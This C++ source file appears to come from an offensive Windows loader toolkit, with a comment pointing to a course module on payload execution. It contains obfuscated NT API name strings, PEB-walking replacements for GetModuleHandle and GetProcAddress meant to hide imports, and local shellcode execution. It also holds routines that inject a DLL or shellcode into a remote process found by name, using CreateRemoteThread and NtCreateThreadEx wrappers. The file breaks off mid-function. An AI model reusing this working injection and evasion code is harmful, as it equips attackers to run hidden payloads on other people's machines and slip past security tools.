/* ---- Includes ----- */
#include "structures.h"
#include "functions.h"
#include "obfuscator.h"
#include "encryption.h"
#include "includes.h"
#include "payloads.h"
/* Obfuscator Strings */
char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789";
char big_numbers[] = "1234567.890";

/* [CUSTOM Obfuscated Strings.] */
int str_LdrGetProcedureAddress[] = { 37,3,17,32,4,19,41,17,14,2,4,3,20,17,4,26,3,3,17,4,18,18 };
int str_ntdll_offsets[] = { 39, 45, 29, 37, 37, 52, 29, 37, 37 };
int str_LdrLoadDll[] = { 37,3,17,37,14,0,3,29,11,11 };
int str_NtAllocateVirtualMemory[] = { 39,19,26,11,11,14,2,0,19,4,47,8,17,19,20,0,11,38,4,12,14,17,24 };
int str_NtFreeVirtualMemory[] = { 39,19,31,17,4,4,47,8,17,19,20,0,11,38,4,12,14,17,24 };
int str_GetProcAddress[] = { 32,4,19,41,17,14,2,26,3,3,17,4,18,18, };
int str_NtProtectVirtualMemory[] = { 39,19,41,17,14,19,4,2,19,47,8,17,19,20,0,11,38,4,12,14,17,24 };
int str_NtCreateThreadEx[] = { 39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23 };
int str_NtWriteProcessMemory[] = { 39,19,48,17,8,19,4,41,17,14,2,4,18,18,38,4,12,14,17,24 };


/* [CUSTOM stringtoWstring converter] */
wstring stringToWstring(const string& str) {
	wstring_convert<codecvt_utf8<wchar_t>> converter;
	return converter.from_bytes(str);
}

/* [CUSTOM rockyGetProcAddress function */
void* rockyGetProcAddress(HMODULE hModule, const char* functionName) {
	std::string deob_ntdll = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets)).c_str();
	std::wstring deobfuscated_ntdll = stringToWstring(deob_ntdll);

	HMODULE NTDLL = rockyGetModuleHandle2(deobfuscated_ntdll.c_str());
	if (!NTDLL) {
		rockyPrintColor(red, "Failed to load NTDLL");
		return NULL;

	}
	std::string deobbed_getproc_str = rockyGetString(str_LdrGetProcedureAddress, big_string, sizeof(str_LdrGetProcedureAddress));
	const char* deobbed_getproc = deobbed_getproc_str.c_str();

	s_LdrGetProcedureAddress LdrGetProcedureAddress = (s_LdrGetProcedureAddress)GetProcAddress(NTDLL, deobbed_getproc);

	if (!LdrGetProcedureAddress) {
		rockyPrintColor(red, "Failed to get LdrGetProcedureAddress");
		return NULL;
	}
	ANSI_STRING ansiFunctionName;
	RtlInitAnsiString(&ansiFunctionName, functionName);
	PVOID functionAddress = NULL;

	NTSTATUS status = LdrGetProcedureAddress(hModule, &ansiFunctionName, 0, &functionAddress);

	if (status != 0) {
		rockyPrintColor(red, "Failed to retrive the address for %s", functionName);
		return NULL;
	}
	return functionAddress;
}

/* [CUSTOM GetModuleHandle Function helper that takes 2 strings, convert them to lowercase, compare them, and return true if both are equal, false otherwise] */
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {

	WCHAR lStr1[MAX_PATH], lStr2[MAX_PATH];

	int	len1 = lstrlenW(Str1), len2 = lstrlenW(Str2);

	int		i = 0,
		j = 0;

	if (len1 >= MAX_PATH || len2 >= MAX_PATH)
		return FALSE;

	for (i = 0; i < len1; i++) {
		lStr1[i] = (WCHAR)tolower(Str1[i]);
	}
	lStr1[i++] = L'\0';


	for (j = 0; j < len2; j++) {
		lStr2[j] = (WCHAR)tolower(Str2[j]);
	}
	lStr2[j++] = L'\0';


	if (lstrcmpiW(lStr1, lStr2) == 0)
		return TRUE;

	return FALSE;
}

/* [CUSTOM GetModuleHandle Implementation Function that replaces GetModuleHandle, uses pointers to enumerate in the DLLs] */
HMODULE rockyGetModuleHandle(IN LPCWSTR szModuleName) {

	// getting peb
#ifdef _WIN64 // if compiling as x64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	// geting Ldr
	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	// getting the first element in the linked list (contains information about the first module)
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {

		// if not null
		if (pDte->FullDllName.Length != NULL) {

			// check if both equal
			if (IsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
				//wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);
#ifdef STRUCTS
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
				return (HMODULE)pDte->Reserved2[0];
#endif // STRUCTS

			}

			// wprintf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);
		}
		else {
			break;
		}

		// next element in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

	}

	return NULL;
}

/* [CUSTOM GetModuleHandle Implementation Function that replaces GetModuleHandle, uses head and node to enumerate in DLL's uding doubly linked list concept] */
HMODULE rockyGetModuleHandle2(IN LPCWSTR szModuleName) {

#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pPeb->Ldr->InMemoryOrderModuleList.Flink);

	// getting the head of the linked list ( used to get the node & to check the end of the list)
	PLIST_ENTRY				pListHead = (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
	// getting the node of the linked list
	PLIST_ENTRY				pListNode = (PLIST_ENTRY)pListHead->Flink;

	do
	{
		if (pDte->FullDllName.Length != NULL) {
			if (IsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
				//wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);
#ifdef STRUCTS
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
				return (HMODULE)pDte->Reserved2[0];
#endif // STRUCTS
			}

			//wprintf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);

			// updating pDte to point to the next PLDR_DATA_TABLE_ENTRY in the linked list
			pDte = (PLDR_DATA_TABLE_ENTRY)(pListNode->Flink);

			// updating the node variable to be the next node in the linked list
			pListNode = (PLIST_ENTRY)pListNode->Flink;

		}

		// when the node is equal to the head, we reached the end of the linked list, so we break out of the loop
	} while (pListNode != pListHead);



	return NULL;
}

// Local shellcode execution - Review "Local Payload Execution - Shellcode" module
BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

	PVOID pShellcodeAddress = NULL;
	DWORD dwOldProtection = NULL;

	pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
	memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

	if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[#] Press <Enter> To Run ... ");
	getchar();

	if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

/* [CUSTOM LoadLibrary Implementation Function that replaces LoadLibrary] */
void* rockyLoadLibrary(const wchar_t* dllName) {
	UNICODE_STRING unicodeString;
	RtlInitUnicodeString(&unicodeString, dllName);

	std::wstring deobfuscated_ntdll = stringToWstring(rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets)).c_str());
	HMODULE NTDLL = rockyGetModuleHandle2(deobfuscated_ntdll.c_str());
	if (!NTDLL) {
		std::cerr << "Failed to load ntdll.dll" << std::endl;
		return NULL;
	}

	typedef NTSTATUS(NTAPI* s_LdrLoadDll)(
		PWSTR PathToFile,
		ULONG Flags,
		PUNICODE_STRING ModuleFileName,
		PHANDLE ModuleHandle
		);

	std::string deobbed_ldrloaddll = rockyGetString(str_LdrLoadDll, big_string, sizeof(str_LdrLoadDll));
	const char* deobbed_ldr_dll_load = deobbed_ldrloaddll.c_str();

	s_LdrLoadDll rockyLoadLibrary = (s_LdrLoadDll)rockyGetProcAddress(NTDLL, deobbed_ldr_dll_load);
	if (!rockyLoadLibrary) {
		std::cerr << "Failed to retrieve LdrLoadDll" << std::endl;
		return NULL;
	}

	HANDLE moduleHandle = NULL;
	NTSTATUS status = rockyLoadLibrary(NULL, 0, &unicodeString, &moduleHandle);
	if (status != 0) {
		std::cerr << "Failed to load DLL: " << dllName << std::endl;
		return NULL;
	}

	return (void*)moduleHandle;
}

/* [CUSTOM rockyPrintColor Implementation Function to print colors] */
void rockyPrintColor(ConsoleColor color, const char* format, ...) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
	char buffer[1024];
	va_list args;
	va_start(args, format);
	vsnprintf(buffer, sizeof(buffer), format, args);
	va_end(args);
	printf("%s\n", buffer);
	SetConsoleTextAttribute(hConsole, default_color);
}

/* [CUSTOM HANDLES BASIC DATA rockAlloc Implementation to Allocate data to memory] */
NTSTATUS rockyAlloc(const void* data, size_t size, void** outAddress) {
	if (outAddress == NULL) {
		return STATUS_INVALID_PARAMETER;
	}
	*outAddress = NULL;

	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();

	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		return STATUS_DLL_NOT_FOUND;
	}

	const char* deobbed_ntallocmem = "NtAllocateVirtualMemory";
	//const char* deobbed_allocate_virtual_memory = deobbed_ntallocmem.c_str();

	s_NtAllocateVirtualMemory rockyAllocateVirtualMemory = (s_NtAllocateVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_ntallocmem);
	if (rockyAllocateVirtualMemory == NULL) {
		return STATUS_NOT_FOUND;
	}

	PVOID baseAddress = NULL;
	SIZE_T regionSize = size;

	NTSTATUS status = rockyAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != STATUS_SUCCESS) {
		return status;
	}

	memcpy(baseAddress, data, size);
	*outAddress = baseAddress;
	return STATUS_SUCCESS;
}

/* [CUSTOM HANDLES DIFFERENT PROCESS rockyAlloc Implmentation to Allocate data to memory, but with different process] */
NTSTATUS rockyAlloc(HANDLE hProcess, const void* data, size_t size, void** outAddress) {
	if (outAddress == NULL) {
		return STATUS_INVALID_PARAMETER;
	}
	*outAddress = NULL;

	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();

	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		return STATUS_DLL_NOT_FOUND;
	}

	std::string deobbed_ntallocmem = rockyGetString(str_NtAllocateVirtualMemory, big_string, sizeof(str_NtAllocateVirtualMemory));
	const char* deobbed_allocate_virtual_memory = deobbed_ntallocmem.c_str();

	s_NtAllocateVirtualMemory rockyAllocateVirtualMemory = (s_NtAllocateVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_allocate_virtual_memory);
	if (rockyAllocateVirtualMemory == NULL) {
		return STATUS_NOT_FOUND;
	}

	PVOID baseAddress = NULL;
	SIZE_T regionSize = size;


	NTSTATUS status = rockyAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != STATUS_SUCCESS) {
		return status;
	}

	memcpy(baseAddress, data, size);
	*outAddress = baseAddress;
	return STATUS_SUCCESS;
}

/* [CUSTOM HANDLES STRING DATA rockyAlloc Implmentation to support string data] */
NTSTATUS rockyAlloc(const char* stringData, void** outAddress) {
	if (stringData == NULL || outAddress == NULL) {
		return STATUS_INVALID_PARAMETER;
	}

	size_t size = strlen(stringData) + 1; // +1 for null terminator
	return rockyAlloc(static_cast<const void*>(stringData), size, outAddress);
}

/* [CUSTOM rockyDealloc, used to free memory ] */
NTSTATUS rockyDealloc(void* pAddress) {
    if (pAddress == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
    const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();
    HMODULE NTDLL_HANDLE = rockyGetModuleHandle2(deobbed_ntdld_wchar);
    if (NTDLL_HANDLE == NULL) {
        return STATUS_DLL_NOT_FOUND;
    }

    std::string deobbed_ntfreevirtmem = rockyGetString(str_NtFreeVirtualMemory, big_string, sizeof(str_NtFreeVirtualMemory));
    const char* deobbed_free_virt_mem = deobbed_ntfreevirtmem.c_str();

    s_NtFreeVirtualMemory rockyFreeVirtualMemory = (s_NtFreeVirtualMemory)rockyGetProcAddress(NTDLL_HANDLE, deobbed_free_virt_mem);
    if (rockyFreeVirtualMemory == NULL) {
        return STATUS_NOT_FOUND;
    }

    SIZE_T regionSize = 0;
    NTSTATUS status = rockyFreeVirtualMemory(GetCurrentProcess(), &pAddress, &regionSize, MEM_RELEASE);
    if (status != STATUS_SUCCESS) {
        return status;
    }

    return STATUS_SUCCESS;
}

/* [CUSTOM rockyPrintAllocated function used to retrieve and print data from allocated memory] */
void rockyPrintAllocated(const void* pAddress, size_t size) {
	if (pAddress == NULL) {
		rockyPrintColor(red, "Invalid Address");
		return;
	}

	const unsigned char* bytePtr = static_cast<const unsigned char*>(pAddress);
	rockyPrintColor(green, "[*] rockyPrintAllocated: working ");
	for (size_t i = 0; i < size; ++i) {
		printf("%02X ", bytePtr[i]);
	}
	printf("\n");
}

NTSTATUS rockyVirtualProtect(HANDLE hProcess, PVOID baseAddress, SIZE_T regionSize, ULONG newProtect, PULONG oldProtect) {
	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();
	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		rockyPrintColor(red, "Failed to get a handle on NTDLL");
		return STATUS_DLL_NOT_FOUND;
	}

	typedef NTSTATUS(NTAPI* s_NtProtectVirtualMemory)(
		HANDLE ProcessHandle,
		PVOID* BaseAddress,
		PSIZE_T RegionSize,
		ULONG NewProtect,
		PULONG OldProtect
		);

	std::string deobbed_ntprotect = rockyGetString(str_NtProtectVirtualMemory, big_string, sizeof(str_NtProtectVirtualMemory));
	const char* deobbed_ntprotect_mem = deobbed_ntprotect.c_str();
	s_NtProtectVirtualMemory pNtProtectVirtualMemory = (s_NtProtectVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_ntprotect_mem);
	if (pNtProtectVirtualMemory == NULL) {
		rockyPrintColor(red, "Failed to get address of NtProtectVirtualMemory");
		return STATUS_NOT_FOUND;
	}

	PVOID baseAddressPtr = baseAddress;
	SIZE_T regionSizeVal = regionSize;

	NTSTATUS status = pNtProtectVirtualMemory(hProcess, &baseAddressPtr, &regionSizeVal, newProtect, oldProtect);
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtProtectVirtualMemory failed with status: " << status << " (" << GetLastError() << ")" << std::endl;
		return status;
	}

	return STATUS_SUCCESS;
}

NTSTATUS rockyNtClose(HANDLE handle) {
	HMODULE NTDLL = rockyGetModuleHandle2(L"ntdll.dll");
	if (NTDLL == NULL) {
		std::cerr << "Failed to get handle to NTDLL." << std::endl;
		return STATUS_DLL_NOT_FOUND;
	}

	s_NtClose pNtClose = (s_NtClose)rockyGetProcAddress(NTDLL, "NtClose");
	if (pNtClose == NULL) {
		std::cerr << "Failed to get address of NtClose." << std::endl;
		return STATUS_NOT_FOUND;
	}

	return pNtClose(handle);
}

/* [CUSTOM rockyCreateThread function used to create a thread in the virtual address space of a specified process] */
NTSTATUS rockyCreateThreadEx(_Out_ PHANDLE ThreadHandle,_In_ ACCESS_MASK DesiredAccess,_In_opt_ POBJECT_ATTRIBUTES64 ObjectAttributes, _In_ HANDLE ProcessHandle,_In_ LPTHREAD_START_ROUTINE StartRoutine,_In_opt_ PVOID Argument,_In_ ULONG CreateFlags,_In_ SIZE_T ZeroBits,_In_ SIZE_T StackSize,_In_ SIZE_T MaximumStackSize,_In_opt_ PPS_ATTRIBUTE_LIST AttributeList) {
	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();
	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		rockyPrintColor(red, "Failed to get a handle on NTDLL");
		return STATUS_DLL_NOT_FOUND;
	}
	std::string deobbed_ntcreatethread = rockyGetString(str_NtCreateThreadEx, big_string, sizeof(str_NtCreateThreadEx));
	const char* deobbed_ntcreate_thread = deobbed_ntcreatethread.c_str();
	s_NtCreateThreadEx pNtCreateThreadEx = (s_NtCreateThreadEx)rockyGetProcAddress(NTDLL, deobbed_ntcreate_thread);
	if (pNtCreateThreadEx == NULL) {
		rockyPrintColor(red, "Failed");
		return STATUS_NOT_FOUND;
	}
	return pNtCreateThreadEx(
		ThreadHandle,
		DesiredAccess,
		ObjectAttributes,
		ProcessHandle,
		(PUSER_THREAD_START_ROUTINE)StartRoutine,
		Argument,
		CreateFlags,
		ZeroBits,
		StackSize,
		MaximumStackSize,
		AttributeList
	);
}

VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}

}

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}

void ensureMultipleOfSix(unsigned char*& data, size_t& size) {
	if (size % 6 != 0) {
		size_t new_size = size + (6 - (size % 6));
		unsigned char* padded_data = new unsigned char[new_size];
		memcpy(padded_data, data, size);
		memset(padded_data + size, 0x00, new_size - size); // Add padding (e.g., zeroes)
		data = padded_data;
		size = new_size;
	}
}

LPVOID rockyVirtualAllocEx(
	HANDLE hProcess,       // Handle to the process
	LPVOID lpAddress,      // Base address for allocation (NULL for system to choose)
	SIZE_T dwSize,         // Size of the allocation
	DWORD flAllocationType, // Allocation type (e.g., MEM_COMMIT | MEM_RESERVE)
	DWORD flProtect        // Memory protection (e.g., PAGE_READWRITE)
) {
	// Deobfuscate ntdll.dll
	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();

	// Get the Module handle for ntdll.dll
	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		std::cerr << "Failed to get handle for ntdll.dll." << std::endl;
		return NULL; // Return NULL if ntdll.dll cannot be found
	}

	// Deobfuscate NtAllocateVirtualMemory
	std::string deobbed_ntallocmem = rockyGetString(str_NtAllocateVirtualMemory, big_string, sizeof(str_NtAllocateVirtualMemory));
	const char* deobbed_allocate_virtual_memory = deobbed_ntallocmem.c_str();

	// Get the NtAllocateVirtualMemory function from the NTDLL module
	s_NtAllocateVirtualMemory rockyAllocateVirtualMemory = (s_NtAllocateVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_allocate_virtual_memory);
	if (rockyAllocateVirtualMemory == NULL) {
		std::cerr << "Failed to get address for NtAllocateVirtualMemory." << std::endl;
		return NULL; // Return NULL if the function is not found
	}

	// Prepare for memory allocation
	PVOID baseAddress = lpAddress; // Base address (can be NULL)
	SIZE_T regionSize = dwSize;    // Size of the allocation

	// Call NtAllocateVirtualMemory
	NTSTATUS status = rockyAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, flAllocationType, flProtect);

	// Check the status of the allocation
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
		return NULL; // Return NULL on failure
	}

	// Return the allocated memory address on success
	return baseAddress;
}

BOOL rockyWriteToProcessMemory(HANDLE hProcess, PVOID address, PVOID data, SIZE_T size, SIZE_T* bytesWritten) {
	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
	if (ntdllHandle == NULL) {
		std::cerr << "Failed to get handle for ntdll.dll" << std::endl;
		return FALSE;
	}

	s_NtWriteVirtualMemory NtWriteVirtualMemory =
		(s_NtWriteVirtualMemory)GetProcAddress(ntdllHandle, "NtWriteVirtualMemory");

	if (NtWriteVirtualMemory == NULL) {
		std::cerr << "Failed to retrieve the address for NtWriteVirtualMemory" << std::endl;
		return FALSE;
	}

	NTSTATUS status = NtWriteVirtualMemory(hProcess, address, data, size, bytesWritten);

	if (status != STATUS_SUCCESS) {
		std::cerr << "NtWriteVirtualMemory failed with status: " << status << std::endl;
		return FALSE;
	}

	return TRUE;
}

/* Function that will inject a DLL, DLLName, into a remote process of handle */
BOOL rockyInjectDLL(HANDLE hProcess, LPWSTR DllName) {
	BOOL		bSTATE = TRUE;
	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;
	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T		lpNumberOfBytesWritten = NULL;
	HANDLE		hThread = NULL;

	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	if (hKernel32 == NULL) {
		printf("[!] GetModuleHandle failed with error: %d \n", GetLastError());
		return FALSE;
	}

	pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndInjection;
	}
	pAddress = rockyVirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		rockyPrintColor(red, "rockyVirtualAllocEx Failed: %d \n", GetLastError());
		bSTATE = FALSE; goto _EndInjection;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %lu\n", pAddress, (unsigned long)dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	(void)getchar();


	// Writing DllName to the allocated memory pAddress
	if (!rockyWriteToProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		rockyPrintColor(red, "rockyWriteProcessMemory Failed: %d \n", GetLastError());
		bSTATE = FALSE; goto _EndInjection;
	}
	printf("[i] Successfully Written %zu Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	(void)getchar();

	// Running LoadLibraryW in a new thread, passing pAddress as a parameter which contains the DLL name
	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndInjection;
	}
	rockyPrintColor(green, "DONE!!\n");

_EndInjection:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;

}

BOOL rockyInjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
	PVOID pShellcodeAddress = NULL;
	SIZE_T sNumberOfBytesWritten = 0;
	DWORD dwOldProtection = 0;

	// Allocate memory in the target process
	pShellcodeAddress = rockyVirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		rockyPrintColor(red, "rockyVirtualAllocEx failed with error: %d", GetLastError());
		return FALSE;
	}
	rockyPrintColor(green, "Allocation Success at 0x%p", pShellcodeAddress);
	rockyPrintColor(yellow, "Press Enter to Write Payload....");
	(void)getchar();

	// Write the shellcode to the allocated memory
	if (!rockyWriteToProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		rockyPrintColor(red, "rockyWriteProcess Failed with error: %d", GetLastError());
		return FALSE;
	}
	rockyPrintColor(green, "Successfully written %d Bytes", sNumberOfBytesWritten);

	// Clear the shellcode from the local buffer (for security)
	memset(pShellcode, '\0', sSizeOfShellcode);

	// Change the memory protection of the allocated space to execute
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		rockyPrintColor(red, "VirtualProtectEx failed with error: %d", GetLastError());
		return FALSE;
	}

	rockyPrintColor(yellow, "Press Enter to Run ....");
	(void)getchar();
	rockyPrintColor(yellow, "Executing Payload ...");

	// Create a remote thread to execute the shellcode
	if (CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL) == NULL) {
		rockyPrintColor(red, "CreateRemoteThread Failed with error: %d", GetLastError());
		return FALSE;
	}

	rockyPrintColor(green, "Finished");
	return TRUE; // Return success
}

// Gets the process handle of a process of name, szProcessName
BOOL rockyGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc;
	Proc.dwSize = sizeof(PROCESSENTRY32);

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, sizeof(LowerName));

			// Converting each charachter in Proc.szExeFile to a lowercase character and saving it
			// in LowerName to perform the wcscmp call later

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// Compare the enumerated process path with what is passed

		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the process ID 
			*dwProcessId = Proc.th32ProcessID;
			// Open a process handle and return
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
		// While we can still have a valid output ftom Process32Next, continue looping
	} while (Process32Next(hSnapShot, &Proc));



_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

#pragma warning (disable:4996)
NTSTATUS rockyVirtualProtect2(HANDLE hProcess, PVOID baseAddress, SIZE_T regionSize, ULONG newProtect, PULONG oldProtect) {
	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();

	// Get handle to NTDLL
	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		rockyPrintColor(red, "Failed to get a handle on NTDLL");
		return STATUS_DLL_NOT_FOUND;
	}

	// Get the address of NtProtectVirtualMemory
